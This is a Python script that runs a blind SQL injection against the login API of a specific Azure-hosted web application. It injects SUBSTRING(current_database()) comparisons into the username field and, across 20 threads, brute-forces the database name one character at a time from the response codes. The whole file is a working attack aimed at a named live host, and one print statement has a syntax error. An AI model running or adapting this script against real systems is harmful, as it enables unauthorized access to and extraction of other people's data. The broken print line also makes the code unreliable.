import requests
import string
import concurrent.futures

url="https://d7a1apsi13-wa01kbtcom.azurewebsites.net/api-core/login-auth"
ans=list()
for i in range(17):
    ans.append('0')
def find(i,j):
    data={
                    "username":f"ad.pentester001' and SUBSTRING(current_database(),{i},1)='{j}'--",
                    "password":"ewgwegwergv"
                    }
    print("[info] sending.."i,j)
    response = requests.post(url,json=data)
    if response.status_code==200:
        print(f"[!!!] We found that position {i} is {j}")
        return [i,j]
    return None

# response=requests.get(url,cookies=cookie)
text=string.printable

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor :
    outcome = [executor.submit(find,i,j) for i in range(17) for j in text]

    for output in concurrent.futures.as_completed(outcome):
        result=output.result()
        if result is not None:
            ans[result[0]-1]=result[1]
print("".join(ans))